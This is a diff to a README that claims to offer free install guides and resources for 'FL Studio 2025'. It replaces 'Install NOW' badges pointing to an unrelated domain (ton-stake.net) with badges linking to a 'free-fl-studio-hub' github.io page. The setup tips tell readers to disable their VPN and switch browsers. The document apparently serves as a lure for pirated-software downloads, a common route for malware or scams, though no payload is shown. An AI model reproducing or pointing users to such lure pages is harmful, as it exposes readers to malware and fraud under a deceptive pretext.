@@ -5,7 +5,9 @@
 
 **Description**: Unleash your musical potential with **FL Studio 2025**, a premium DAW for music production! This repository offers tutorials, resources, and tips to explore FL Studio’s advanced tools for beatmaking, mixing, and mastering. Start with accessible music resources and join our vibrant community of producers in 2025!  
 
-[![Install FL Studio 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://free-fl-studio-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
@@ -33,7 +35,9 @@ Kickstart your music production with these simple steps to set up FL Studio 2025
    - Disable your VPN to avoid connection issues.  
    - Switch to another browser (e.g., Chrome, Firefox, or Edge) for a smoother experience.  
 
-[![Install FL Studio 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://free-fl-studio-hub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ---
 
